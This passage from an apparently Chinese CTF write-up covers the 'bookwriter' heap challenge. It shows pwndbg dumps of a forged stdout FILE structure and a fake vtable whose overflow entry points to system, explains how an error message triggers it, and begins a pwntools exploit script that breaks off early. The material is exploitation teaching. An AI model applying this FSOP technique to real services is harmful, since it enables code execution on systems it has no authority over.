&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b88&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\300\302\002\001&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b88&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\300\302\002\001&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b98&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\210\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b98&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\210\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30ba8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;136&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\230\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30ba8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;136&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\230\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bb8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;152&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\250\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bb8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;152&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\250\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;-1595733032&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;32635&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;140168956939224&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;3048&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;-29&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\343&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;\240&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30be8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;140168956939256&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bf8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;216&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30c08&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;232&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30c08&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;232&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30c18&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;248&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;140168956939288&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1595732952&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;\177\000\000(\f\343\240&amp;#123;\177\000\000\070\f\343&amp;quot;&lt;/span&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30c38&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;280&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//bins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smallbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bc8&lt;/span&gt; (main_arena+&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//fakefile2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;1852400175&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x61&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x61&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bc8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\270\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30bc8&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;168&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\270\v\343\240&amp;#123;\177&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x3&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x3&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;\377\377\377\377&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x102c3a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//伪造的vtable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_jump_t *) &lt;span class=&#34;number&#34;&gt;0x102c3a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0x7f7ba0ab13a0&lt;/span&gt; &amp;lt;__libc_system&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面要考虑的就是如何出发伪造的 vtable。首先我们这里的 fakefile2 取代了 stdout，所以当程序报错的输出信息时，会调用 over_flow，我们在伪造的 vtable 对应位置写入 system。&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./bookwriter&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./bookwriter&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;/lib/x86_64-linux-gnu/libc-2.23.so&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cnt = &lt;span class=&#34;number&#34;&gt;0x602040&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name = &lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;#size=64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gp = &lt;span class=&#34;number&#34;&gt;0x6020A0&lt;/span&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gs = &lt;span class=&#34;number&#34;&gt;0x6020E0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	